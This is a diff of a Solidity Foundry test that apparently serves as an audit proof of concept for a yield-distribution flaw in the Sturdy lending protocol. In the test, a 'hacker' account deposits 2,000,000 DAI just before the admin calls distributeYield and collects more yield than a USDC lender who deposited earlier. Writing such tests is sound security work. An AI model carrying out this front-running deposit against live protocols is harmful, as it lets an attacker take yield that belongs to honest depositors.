@@ -250,40 +250,12 @@ contract SturdyTest is Test, Helper {
     }
 
     function test_M6_yield_unfair_distribution() external {
-        uint256 deposit_amount = 100_000_000_000;
-        vm.prank(ILpToken(lpToken).minter());
-        ILpToken(lpToken).mint(bob, deposit_amount);
+        // deposit usdc in lending pool
+        uint256 deposit_amount = 5000 * (10 ** 6);
+        address usdcLender = 0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2; // USDC lender
+        depositUSDC(usdcLender, deposit_amount);
 
-        vm.startPrank(bob);
-        // approve vault for lpToken
-        IERC20(lpToken).approve(address(convexVault), deposit_amount);
-        // deposit lpToken to Convex vault
-        convexVault.depositCollateral(lpToken, deposit_amount);
-        vm.stopPrank();
-
-        uint256 crv_yieldManagerBefore = IERC20(CRV_ADDRESS).balanceOf(address(yieldManager));
-        uint256 cvx_yieldManagerBefore = IERC20(CRV_ADDRESS).balanceOf(address(yieldManager));
-
-        // to simulate yield of convexVault
-        vm.warp(block.timestamp + 100_000);
-        convexVault.processYield();
-
-        // check balances
-        uint256 crv_yieldManagerAfter = IERC20(CRV_ADDRESS).balanceOf(address(yieldManager));
-        uint256 cvx_yieldManagerAfter = IERC20(CRV_ADDRESS).balanceOf(address(yieldManager));
-
-        console.log(
-            "CRV balance before/after processing yield: %s / %s",
-            crv_yieldManagerBefore,
-            crv_yieldManagerAfter
-        );
-        console.log(
-            "CVX balance before/after processing yield: %s / %s",
-            cvx_yieldManagerBefore,
-            cvx_yieldManagerAfter
-        );
-
-        // hacker deposits stETH in lidoVault before processing Yield
+        // deposit stETH in lidoVault
         alice = 0x4C49d4Bd6a571827B4A556a0e1e3071DA6231B9D;
         deposit_amount = 2 ether;
         vm.startPrank(alice);
@@ -295,6 +267,7 @@ contract SturdyTest is Test, Helper {
         vm.stopPrank();
 
         // transfer some stETh to stEthAToken so simulate yield in lending pool
+        deposit_amount = 5 ether;
         vm.prank(alice);
         ILido(stETHAddress).transfer(stETHaTokenProxyAddress, deposit_amount);
 
@@ -302,35 +275,63 @@ contract SturdyTest is Test, Helper {
         uint256 weth_yieldManagerBefore = IERC20(WETH).balanceOf(address(yieldManager));
         lidoVault.processYield();
         uint256 weth_yieldManagerAfter = IERC20(WETH).balanceOf(address(yieldManager));
-
         assertTrue(weth_yieldManagerAfter > weth_yieldManagerBefore);
 
-        console.log(
-            "WETH balance of Yield Manager before/after processing yield: %s / %s",
-            weth_yieldManagerBefore,
-            weth_yieldManagerAfter
-        );
+        // just assume that this much time has passed since the last lender's deposit
+        vm.warp(block.timestamp + 1_000_000);
 
-        // register assets with yield manager
-        yieldManager.registerAsset(WETH);
-        yieldManager.registerAsset(CRV_ADDRESS);
-        yieldManager.registerAsset(CVX_ADDRESS);
+        // hacker deposits dai in lending pool just before the admin distributes yield
+        deposit_amount = 2_000_000 * 10 ** 18;
+        address daiLender = 0x60FaAe176336dAb62e284Fe19B885B095d29fB7F; // DAI lender
+        uint256 lenderBalanceBefore = IERC20(DAI).balanceOf(daiLender);
+        depositDAI(daiLender, deposit_amount);
 
-        // yieldManager.setCurvePool(WETH, stETHAddress,
-        // 0x828b154032950C8ff7CF8085D841723Db2696056);
+        // balances of deposits before distributing yields
+        uint256 daiBeforeDistributingYield = IERC20(DAI).balanceOf(daiATokenProxyAddress);
+        uint256 usdcBeforeDistributingYield = IERC20(USDC).balanceOf(usdcATokenProxyAddress);
 
-        // distribute yeild
-        uint256 dai_yieldManagerBefore = IERC20(DAI).balanceOf(address(yieldManager));
+        // distribute yield
         yieldManager.distributeYield(0, 1);
-        uint256 dai_yieldManagerAfter = IERC20(DAI).balanceOf(address(yieldManager));
 
-        console.log(
-            "DAI balance of Yield Manager before/after distributing yield: %s / %s",
-            dai_yieldManagerBefore,
-            dai_yieldManagerAfter
-        );
+        // balances of deposits after distributing yields
+        uint256 daiAfterDistributingYield = IERC20(DAI).balanceOf(daiATokenProxyAddress);
+        uint256 usdcAfterDistributingYield = IERC20(USDC).balanceOf(usdcATokenProxyAddress);
 
-        // 17380967
-        // 3663318849987590120804
+        uint256 lenderBalanceAfter = IERC20(DAI).balanceOf(daiLender);
+
+        // balances increase of tokens
+        // hacker
+        uint256 daiIncrease = daiAfterDistributingYield - daiBeforeDistributingYield;
+        // lender who waited for yield
+        uint256 usdcIncrease = usdcAfterDistributingYield - usdcBeforeDistributingYield;
+
+        console.log("DAI Balance before:\t %s", daiBeforeDistributingYield);
+        console.log("DAI Balance after:\t %s", daiAfterDistributingYield);
+    
+        console.log("USDC Balance before:\t %s", usdcBeforeDistributingYield);
+        console.log("USDC Balance after:\t %s", usdcAfterDistributingYield);
+
+        console.log("Yield acquired by hacker (DAI): $%s", daiIncrease / 10 ** 18);
+        console.log("Yield acquired by lender (USDC): $%s", usdcIncrease / 10 ** 6);
+
+        assertGt(daiIncrease/10**18, usdcIncrease/10**6);
+    }
+
+    function depositDAI(address _lender, uint256 _amount) internal {
+        vm.startPrank(_lender);
+        // approve lending pool for DAI
+        IERC20(DAI).approve(lendingPoolProxyAddress, _amount);
+        // deposit
+        LendingPool(lendingPoolProxyAddress).deposit(DAI, _amount, _lender, 0);
+        vm.stopPrank();
+    }
+
+    function depositUSDC(address _lender, uint256 _amount) internal {
+        vm.startPrank(_lender);
+        // approve lending pool for DAI
+        IERC20(USDC).approve(lendingPoolProxyAddress, _amount);
+        // deposit
+        LendingPool(lendingPoolProxyAddress).deposit(USDC, _amount, _lender, 0);
+        vm.stopPrank();
     }
 }
